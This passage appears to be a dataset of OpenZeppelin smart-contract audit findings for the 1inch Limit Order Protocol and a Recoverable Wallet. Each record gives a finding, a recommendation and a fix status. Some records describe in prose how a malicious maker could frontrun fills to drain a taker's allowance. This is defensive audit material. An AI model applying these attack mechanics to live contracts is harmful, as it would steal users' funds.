      "content": "Orders from the [`OrderMixin`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol) contract have the ability to be partially filled. To support partial fills, the protocol requires a way to calculate both sides of swaps. Both [`getMakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L67) and [`getTakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L68) fields are defined by the maker of the order for this exact purpose.\n\n\nWhen filling an order, takers must provide either the [`makingAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L193) or the [`takingAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L194) values as well as a [`thresholdAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L195) value. There are two different code-paths that can be taken, based on if the `makingAmount` or the `takingAmount` was provided.\n\n\nThe first one is when the [`makingAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L225) parameter is defined. It could [truncate](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L227) the `makingAmount` value and also [calculate the `takingAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L229) value for it. In this situation, the `thresholdAmount` ensures that the `takingAmount` value taken is [not unexpectedly large](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L230).\n\n\nThe second one is when the [`takingAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L232) parameter is defined. In such case, it will [calculate the `makingAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L233) value, with the possibility of [truncating it](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L235) and [recalculating the `takingAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L236) value if that happens. In this situation, the `thresholdAmount` value ensures that the `makingAmount` value returned is [not unexpectedly small](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L238).\n\n\nThere exist two exploitation methods, each unique to one of the previous mentioned code-paths. These exploitation methods require malicious [`getMakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L321) and [`getTakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L332) functions. A simple implementation of these functions would have an identical behavior to [`AmountCalculator`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/AmountCalculator.sol)‘s [`getMakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/AmountCalculator.sol#L14) and [`getTakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/AmountCalculator.sol#L20) functions, but with a hard-coded switch that will force them to return an attacker controlled value when needed.\n\n\nThe first, less severe exploit pattern involves the first code-path where the [`makingAmount` value is specified](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L225) in a fill order. A malicious maker would wait for a fill order which specifies `makingAmount` to show up in the mempool in order to frontrun it. They would drain all of the value except 1 from the maker’s side and then force [`_callGetTakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L315) to return the amount specified in the user’s [`thresholdAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L230) value (or their allowance if it is less). When the user’s transaction finally goes through, they will swap their full [`thresholdAmount` worth of `takerAsset`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L258) for a single unit of [`makerAsset`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L278). This exploit is limited by the amount given by the `thresholdAmount` value or the amount of the `takerAsset` the user allowed on the `LimitOrderProtocol` contract.\n\n\nThe second, more severe exploit pattern involves the second code-path where the [`takingAmount` value is specified](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L232). The malicious maker would similarly wait for a fill order that specified a `takingAmount` value to show up in the mempool. They would frontrun the transaction and force the [`makingAmount` value returned by `_callGetMakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L233) function to be higher than both the `remainingMakerAmount` and the `thresholdAmount`. They would also set the [`takingAmount` returned value by `_callGetTakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L236) to be the amount of `takerAsset` asset allowed on the `LimitOrderProtocol` by the taker. When the taker’s transaction goes through, it will [truncate the `makingAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L235) value and then [recalculate the `takingAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L236) value. This recalculation is not guaranteed to be lower however, and in this case will drain the taker of all the `takerAsset` that they allowed on the contract. In this code-path, the `thresholdAmount` value is [ensuring that the `makingAmount` is not too low](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L238), so taking all the taker’s `takerAsset` asset is unchecked. The funds lost are bounded by the amount of the `takerAsset` asset the user allowed on the `LimitOrderProtocol` contract.\n\n\nThese exploits are not possible without partial orders and, more specifically, partial orders with malicious `getMakerAmount` and `getTakerAmount` implementations.\n\n\nThe main issue of the `thresholdAmount` value check is that it only covers one side of the swap, but the other side can be manipulated via frontrunning. There are no assurances that the value the taker originally proposed remains unchanged. Consider removing `makingAmount` truncation from both code-paths and reverting if the order cannot support a fill as large as requested. By doing this, the `thresholdAmount` can be used to sufficiently restrict the other side of the swap and avoid unexpected behavior, even in malicious orders.\n\n\n***Update:** Fixed in [pull request #83](https://github.com/1inch/limit-order-protocol/pull/83).*",
      "summary": "\nThe bug report describes two exploitation methods related to partial fills of orders from the OrderMixin contract. The first exploit pattern involves the code-path where the makingAmount is specified in a fill order. A malicious maker would wait for a fill order and frontrun it, draining all of the value except 1 from the maker’s side and then forcing the _callGetTakerAmount to return the amount specified in the user’s thresholdAmount value. The second exploit pattern involves the code-path where the takingAmount is specified. A malicious maker would similarly wait for a fill order and frontrun it, setting the takingAmount returned by _callGetTakerAmount to be the amount of takerAsset allowed on the LimitOrderProtocol by the taker. In both cases, the funds lost are bounded by the amount of the takerAsset the user allowed on the LimitOrderProtocol contract.\n\nThe main issue of the thresholdAmount value check is that it only covers one side of the swap, but the other side can be manipulated via frontrunning. To fix this, the makingAmount truncation from both code-paths was removed and the order was reverted if it couldn't support a fill as large as requested. This allowed the thresholdAmount to sufficiently restrict the other side of the swap and avoid unexpected behavior, even in malicious orders. The bug was fixed in pull request #83.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "1inch Limit Order Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/1inch-limit-order-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10679",
      "title": "[H02] Partially-filled private orders can be filled by anyone",
      "impact": "HIGH",
      "content": "The protocol allows the creation of private and public orders. On private orders, only the [`allowedSender`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L62) address, specified by the maker during the order’s creation, is able to fill the order.\n\n\nHowever, in the [`OrderMixin`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol) contract, [validation for the `allowedSender` address](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L204) is incorrectly scoped, meaning that it is only evaluated inside the logic that handles the first fill of an order. If a private order is partially filled, then the check for the `allowedSender` address is no longer reachable and the order becomes fillable by anyone.\n\n\nTo clarify intent around whether any user should be able to fill partially-filled private orders or not, consider either documenting the reason for the current behavior or validating the `allowedSender` address outside of the scope of the first fill to ensure that it will be validated every time a fill is attempted.\n\n\n***Update:** Fixed in [pull request #58](https://github.com/1inch/limit-order-protocol/pull/58).*",
      "summary": "\nThis bug report is about the Limit Order Protocol, which allows users to create private and public orders. Private orders are only fillable by the address specified by the maker during the order’s creation, known as the `allowedSender` address. However, the validation for the `allowedSender` address in the OrderMixin contract was incorrectly scoped, meaning that it was only evaluated when the order was first filled. This meant that after a private order was partially filled, it could be filled by anyone, which was not the intended behavior. \n\nTo fix this bug, the `allowedSender` address needs to be validated outside of the scope of the first fill, so that it is evaluated every time a fill is attempted. This bug has now been fixed in pull request #58.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "1inch Limit Order Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/1inch-limit-order-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10678",
      "title": "[H01] Inconsistent data passed into _makeCall",
      "impact": "HIGH",
      "content": "In the [`OrderMixin`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol) contract, the [`_makeCall`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L308) function is used to transfer assets [from the taker to the maker](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L252) and then [from the maker to the taker](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L272). In the latter transfer, the `_makeCall` function is incorrectly passed the order’s [`makerAsset`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L58) as the last parameter, when it should be the order’s [`makerAssetData`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L65).\n\n\nAs a result, any proxy functionality that relies on the `makerAssetData` argument will break.\n\n\nTo be consistent with the earlier call to `_makeCall` and to fully support proxy functionality, consider updating the `order.makerAsset` parameter to `order.makerAssetData`.\n\n\n***Update:** Fixed in [pull request #57](https://github.com/1inch/limit-order-protocol/pull/57).*",
      "summary": "\nA bug was found in the OrderMixin contract which affects the _makeCall function. This function is used to transfer assets from the taker to the maker and then from the maker to the taker. In the latter transfer, the _makeCall function was incorrectly passed the order’s makerAsset as the last parameter, when it should be the order’s makerAssetData. As a result, any proxy functionality that relies on the makerAssetData argument will break. To fix the bug, the parameter should be updated to order.makerAssetData. The bug has since been fixed in pull request #57.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "1inch Limit Order Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/1inch-limit-order-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11785",
      "title": "Overloaded functionality of the start_recovery() function",
      "impact": "LOW",
      "content": "The `start_recovery` function provides two functionalities. One is to allow a recovery address to initiate the recovery process when no recovery is underway. The other is to allow a recovery address with higher priority to usurp the current `active_recovery_address` when a recovery is already underway. These differing intentions both leverage the same function and both emit the same events.\n\n\nConsider disentangling these two functionalities by breaking the existing `start_recovery` function into two separate functions: a `startRecovery` function with the `only_outside_recovery` modifier that provides the first functionality, and a `usurpRecovery` function with the `only_during_recovery` modifier that provides the second functionality.\n\n\n***Update:*** *The**`start_recovery`* *function is still being used to both begin a new recovery and usurp an existing one, but it has been modified so that a* *`RecoveryCancelled`* *event is emitted when usurping. This ensures that the correct events are emitted in the order.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Recoverable Wallet Audit",
      "source_link": "https://blog.openzeppelin.com/recoverable-wallet-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11784",
      "title": "Ownership transfer can be cancelled before one is underway",
      "impact": "LOW",
      "content": "The `cancel_ownership_transfer` function ([line 44](https://github.com/Zoltu/recoverable-wallet/blob/2207f5a7cc3b2607f7f97a769fbca7fe9235952b/contracts/source/recoverable-wallet.sol#L44)) in the `Ownable` contract can be called when the `pending_owner` is `address(0)` (that is, when an ownership transfer is not already underway). This can result in an `ownership_transfer_cancelled` event being emitted without a corresponding `ownership_transfer_started` event having been emitted.\n\n\nIf this is not intended functionality, consider adding a `require(pending_owner != address(0))` to the `cancel_ownership_transfer` function to prevent this.\n\n\n***Update:*** *A r**equire* *statement has been included that prevents the function from being called when no ownership transfer is underway.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Recoverable Wallet Audit",
      "source_link": "https://blog.openzeppelin.com/recoverable-wallet-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11783",
      "title": "Ownership transfer can be started while another is underway",
      "impact": "LOW",
      "content": "The `start_ownership_transfer` function ([line 38](https://github.com/Zoltu/recoverable-wallet/blob/2207f5a7cc3b2607f7f97a769fbca7fe9235952b/contracts/source/recoverable-wallet.sol#L38)) in the `Ownable` contract can be called when the `pending_owner` is NOT `address(0)` (that is, when an ownership transfer is already underway). This can result in two or more `ownership_transfer_started` events being emitted back-to-back, with no `ownership_transfer_cancelled` or `ownership_transfer_finished` events emitted in between.\n\n\nIf this is not intended functionality, consider adding a `require(pending_owner == address(0))` to the `start_ownership_transfer` function to prevent this.\n\n\n***Update:*** *The* *`start_ownership_transfer`* *function (since renamed to* *`startOwnershipTransfer`**) has been modified to first call the* *cancelOwnershipTransfer* *function before beginning a new ownership transfer. This ensures that the correct sequence of events is emitted.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Recoverable Wallet Audit",
      "source_link": "https://blog.openzeppelin.com/recoverable-wallet-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11782",
      "title": "False comment in the start_recovery() function",
      "impact": "LOW",
      "content": "The comment on [line 103](https://github.com/Zoltu/recoverable-wallet/blob/2207f5a7cc3b2607f7f97a769fbca7fe9235952b/contracts/source/recoverable-wallet.sol#L103) states:\n\n\n\n> NOTE: the recovery address cannot change during recovery, so we can rely on this being != 0\n> \n> \n\n\nThe second half of the statement — that “we can rely on this being != 0” is true. However the first part of the statement — that “the recovery address cannot change during recovery” is false. The function that contains the comment (the `start_recovery` function) is the means by which a recovery address can change during recovery. In particular, a recovery address can change during recovery when a recovery address with a higher priority than the current `active_recovery_address` calls the `start_recovery` function.\n\n\n***Update:*** *The comment has be updated to correctly reflect contract behavior.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Recoverable Wallet Audit",
      "source_link": "https://blog.openzeppelin.com/recoverable-wallet-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11781",
      "title": "Duplicate code in the finish_recovery() function",
      "impact": "LOW",
      "content": "[Line 119](https://github.com/Zoltu/recoverable-wallet/blob/2207f5a7cc3b2607f7f97a769fbca7fe9235952b/contracts/source/recoverable-wallet.sol#L119) duplicates the code in the `only_during_recovery` modifier, which is already being applied to the `finish_recovery` function. Consider removing this superfluous line.\n\n\n***Update:*** *The duplicate code has been removed from the* *`finish_recovery`* *function.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Recoverable Wallet Audit",
      "source_link": "https://blog.openzeppelin.com/recoverable-wallet-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11780",
      "title": "Unnecessary call to reset_recovery() in constructor",
      "impact": "LOW",
      "content": "Whether or not the recommendations from the issue **“Unnecessary setting of the active\\_recovery\\_end\\_time variable”** are taken into consideration, the call to `reset_recovery` on [line 80](https://github.com/Zoltu/recoverable-wallet/blob/2207f5a7cc3b2607f7f97a769fbca7fe9235952b/contracts/source/recoverable-wallet.sol#L80) is unnecessary since `active_recovery_address` and `active_recovery_end_time` will be set correctly when `start_recovery` is called. Consider removing this function call.\n\n\n***Update:*** *The call to**`reset_recovery`* *has been removed from the constructor.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Recoverable Wallet Audit",
      "source_link": "https://blog.openzeppelin.com/recoverable-wallet-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11779",
      "title": "Unnecessary setting of the active_recovery_end_time variable",
      "impact": "LOW",
      "content": "The variable `active_recovery_end_time` is consumed only in the `finish_recovery` function (on [line 120](https://github.com/Zoltu/recoverable-wallet/blob/2207f5a7cc3b2607f7f97a769fbca7fe9235952b/contracts/source/recoverable-wallet.sol#L120)), which has the `only_during_recovery` modifier. The `only_during_recovery` modifier passes only when `active_recovery_address != address(0)`. This occurs only after `start_recovery` has been called and before either `cancel_recovery` or `finish_recovery` has been called.\n\n\nSince `start_recovery` sets `active_recovery_end_time`, there is no need to set `active_recovery_end_time = uint256(-1)` on [line 67](https://github.com/Zoltu/recoverable-wallet/blob/2207f5a7cc3b2607f7f97a769fbca7fe9235952b/contracts/source/recoverable-wallet.sol#L67). Consider leaving the `active_recovery_end_time` variable uninitialized on [line 67](https://github.com/Zoltu/recoverable-wallet/blob/2207f5a7cc3b2607f7f97a769fbca7fe9235952b/contracts/source/recoverable-wallet.sol#L67).\n\n\nFor the same reason, it is unnecessary to set `active_recovery_end_time = uint256(-1);` in the `reset_recovery` function on [line 146](https://github.com/Zoltu/recoverable-wallet/blob/2207f5a7cc3b2607f7f97a769fbca7fe9235952b/contracts/source/recoverable-wallet.sol#L146). Consider removing the code at [line 146](https://github.com/Zoltu/recoverable-wallet/blob/2207f5a7cc3b2607f7f97a769fbca7fe9235952b/contracts/source/recoverable-wallet.sol#L146).\n\n\n***Update:*** *No changes have been made here. Setting* *`active_recovery_end_time`* *to* *`uint256(-1)`* *is intended to make code auditing and strict invariant checks easier.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Recoverable Wallet Audit",
      "source_link": "https://blog.openzeppelin.com/recoverable-wallet-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11778",
      "title": "Obscure error message provided upon contract creation failure",
      "impact": "LOW",
      "content": "The `deploy` function attempts to create a contract based on user-provided parameters and checks whether contract creation was successful by checking whether the output of `create2` is a non-zero address. If the wallet contract doesn’t have enough balance to fund the newly created contract with the amount specified in the `_value` parameter, the transaction will revert with the obscure “Contract creation failed.” error message issued by the non-zero address check.\n\n\nConsider splitting this into two checks. First, we suggest adding a `require` statement to the beginning of the `deploy` function that checks whether the `RecoverableWallet` contract has a balance of at least `_value` ETH, and returns a meaningful error message otherwise. Second, rather than checking that the output of `create2` is a non-zero address, we recommend the more stringent requirement that code actually exists at the address returned by the call to `create2` using `extcodesize`.\n\n\n***Update:*** *The**`deploy`* *function has been modified to output more detailed messages in the event of a failed contract deployment. The**`extcodesize`* *option was not used because “a valid* *`create2`* *call may not result in any code actually being deployed at the destination address (e.g.,**`self-destruct`* *in constructor or deployment code returning an empty bytecode array)”.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Recoverable Wallet Audit",
      "source_link": "https://blog.openzeppelin.com/recoverable-wallet-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11777",
      "title": "Mixed usage of the recovery and ownership transfer systems",
      "impact": "LOW",
      "content": "On [line 122](https://github.com/Zoltu/recoverable-wallet/blob/2207f5a7cc3b2607f7f97a769fbca7fe9235952b/contracts/source/recoverable-wallet.sol#L122) the `finish_recovery` function sets `pending_owner = active_recovery_address;`. This requires the recovery address to then call `accept_ownership` in order to become the new owner. While this works fine, it requires two on-chain transactions and may result in an `ownership_transfer_finished` event being emitted without a corresponding `ownership_transfer_started` event preceding it.\n\n\nIf this is undesirable behavior, consider setting the `owner` instead of the `pending_owner` on [line 122](https://github.com/Zoltu/recoverable-wallet/blob/2207f5a7cc3b2607f7f97a769fbca7fe9235952b/contracts/source/recoverable-wallet.sol#L122), and then modifying the `recovery_finished` event accordingly. This would require one fewer on-chain transaction to change owners via the recovery process, and it would keep the recovery process and the ownership transfer system independent of one another.\n\n\n***Update:*** *The**`finish_recovery`* *function (since renamed to* *`finishRecovery`**) has been modified to directly set the new owner and emit the correct sequence of events.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Recoverable Wallet Audit",
      "source_link": "https://blog.openzeppelin.com/recoverable-wallet-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11776",
      "title": "uint256/uint16 type mismatch",
      "impact": "LOW",
      "content": "There is a parameter type mismatch in the `recovery_address_added` event. The `recovery_delay_in_days` parameter in the `recovery_address_added` event ([line 59](https://github.com/Zoltu/recoverable-wallet/blob/2207f5a7cc3b2607f7f97a769fbca7fe9235952b/contracts/source/recoverable-wallet.sol#L59)) is of type `uint256`. This event is emitted on [line 89](https://github.com/Zoltu/recoverable-wallet/blob/2207f5a7cc3b2607f7f97a769fbca7fe9235952b/contracts/source/recoverable-wallet.sol#L89) with its second parameter being passed a `uint16`.\n\n\nConsider using `uint256` rather than `uint16` everywhere.\n\n\n***Update:*** *The type of the**`recovery_delay_in_days`* *parameter has been changed to* *`uint16`* *to resolve the type mismatch.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Recoverable Wallet Audit",
      "source_link": "https://blog.openzeppelin.com/recoverable-wallet-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11775",
      "title": "Recovery cancellation can be front-run",
      "impact": "MEDIUM",
      "content": "Similar to the issue **“Ownership transfer cancellation can be front-run”**, cancellation of the recovery process can also be front-run. After the `start_recovery` function has been called by a recovery address, and after the `active_recovery_end_time` has passed, the owner may wish to call the `cancel_recovery` function to prevent finalization of recovery before someone calls the `finish_recovery` function. After the owner has broadcasted a transaction calling the `cancel_recovery` function — but before that transaction is mined — anyone may call the `finish_recovery` function using a transaction with a higher gas price.\n\n\nWhether or not this is a concern depends upon the intention of the owner when calling `cancel_recovery`. If the intention is to cancel the transfer of ownership to a non-responsive recovery address, then this poses no threat. If the intention, however, is to prevent the transfer of ownership to an `active_recovery_address` that is no longer trusted, then this may pose a threat.\n\n\n***Update:*** *This is intentional functionality and a comment has been added to the code to indicate this.*",
      "summary": "\nThis bug report is about the possibility of front-running the cancellation of the recovery process. This process is used when the owner of a certain asset wishes to transfer ownership to a recovery address, but the owner may wish to cancel the transfer before it is finalized. The issue is that before the cancellation is mined, anyone can call the `finish_recovery` function with a higher gas price, resulting in the transfer of ownership to the recovery address. Whether this is an issue or not depends on the owner's intent when calling `cancel_recovery`. If the intent is to cancel the transfer to a non-responsive recovery address, then this poses no threat. However, if the intent is to prevent the transfer to an `active_recovery_address` that is no longer trusted, then this poses a threat. It is important to note that this is intentional functionality and a comment has been added to the code to indicate this.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Recoverable Wallet Audit",
      "source_link": "https://blog.openzeppelin.com/recoverable-wallet-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11774",
      "title": "Ownership transfer cancellation can be front-run",
      "impact": "MEDIUM",
      "content": "The `RecoverableWallet` contract implements an ownership transfer system whereby the owner may offer ownership of the `Ownable` contract to an address referred to as the `pending_owner`. This is achieved by calling the `start_ownership_transfer` function on [line 38](https://github.com/Zoltu/recoverable-wallet/blob/2207f5a7cc3b2607f7f97a769fbca7fe9235952b/contracts/source/recoverable-wallet.sol#L38). Afterwards, the `pending_owner` may accept ownership by calling the `accept_ownership` function on [line 50](https://github.com/Zoltu/recoverable-wallet/blob/2207f5a7cc3b2607f7f97a769fbca7fe9235952b/contracts/source/recoverable-wallet.sol#L50). If the current owner calls the `cancel_ownership_transfer` function *before* the `pending_owner` calls the `accept_ownership` function, then the offer is rescinded and the `pending_onwer` may no longer claim ownership.\n\n\nAfter the `start_ownership_transfer` function has been called by the owner, the owner may wish to call the `cancel_ownership_transfer` to prevent ownership transfer. After the owner has broadcasted a transaction calling the `cancel_ownership_transfer` function — but before that transaction is mined — the `pending_owner` may call the `accept_ownership` function using a transaction with a higher gas price, thereby accepting ownership before the transaction to rescind the offer has been mined.\n\n\nWhether or not this is a concern depends upon the intention of the owner when calling `cancel_ownership_transfer`. If the intention is to cancel the transfer of ownership to a non-responsive address, then this poses no threat. If the intention, however, is to prevent the transfer of ownership to a `pending_owner` that is no longer trusted, then this may pose a threat.\n\n\n***Update:*** *This is intentional functionality and a comment has been added to the code to indicate this.*",
      "summary": "\nThe `RecoverableWallet` contract implements a system of ownership transfer between two parties, the owner and the pending_owner. The owner can offer ownership to the pending_owner by calling the `start_ownership_transfer` function. The pending_owner can then accept ownership by calling the `accept_ownership` function. The owner can also cancel the offer by calling the `cancel_ownership_transfer` function.\n\nHowever, if the owner broadcasts a transaction to cancel the offer before the pending_owner calls the `accept_ownership` function, the pending_owner may still be able to accept the offer by calling the `accept_ownership` function with a higher gas price before the transaction to rescind the offer is mined. This is intentional functionality and a comment has been added to the code to indicate this.\n\nWhether or not this poses a threat depends on the intention of the owner when calling the `cancel_ownership_transfer` function. If the intention is to cancel the transfer of ownership to a non-responsive address, then this poses no threat. But, if the intention is to prevent the transfer of ownership to a `pending_owner` that is no longer trusted, then this may pose a threat.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Recoverable Wallet Audit",
      "source_link": "https://blog.openzeppelin.com/recoverable-wallet-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11773",
      "title": "Race condition may result from compromised recovery address",
      "impact": "MEDIUM",
      "content": "The `RecoverableWallet` contract implements a recovery system whereby the owner can register a list of recovery addresses using the `add_recovery_address` function on [line 86](https://github.com/Zoltu/recoverable-wallet/blob/2207f5a7cc3b2607f7f97a769fbca7fe9235952b/contracts/source/recoverable-wallet.sol#L86). Each recovery address is associated with a positive `_recovery_delay_in_days`, and a recovery address with a strictly lower`_recovery_delay_in_days` is said to have a “higher priority” than a recovery address with a strictly higher `_recovery_delay_in_days`. The owner is able to remove recovery addresses using the `remove_recovery_address` function on [line 92](https://github.com/Zoltu/recoverable-wallet/blob/2207f5a7cc3b2607f7f97a769fbca7fe9235952b/contracts/source/recoverable-wallet.sol#L92).\n\n\nAt any time, a recover address may begin the recovery process by calling `start_recovery` ([line 97](https://github.com/Zoltu/recoverable-wallet/blob/2207f5a7cc3b2607f7f97a769fbca7fe9235952b/contracts/source/recoverable-wallet.sol#L97) of recoverable-wallet.sol), thereby becoming the `active_recovery_address`. This puts the contract in the “in recovery” state, during which several of the contract’s functions cannot be called, including the `remove_recovery_address` function. The owner can abort the recovery process by calling the `cancel_recovery` function, thereby putting the contract back into the “out of recovery” state.\n\n\nIf a recovery address becomes compromised, the compromised address may call the `start_recovery` function, during which time the owner cannot remove the compromised address via the `remove_recovery_address` function due to the `only_outside_recovery` modifier. To remove the compromised address, the owner must first call the `cancel_recovery` function before calling `remove_recovery_address(<compromised_address>)`.\n\n\nHowever, once the owner 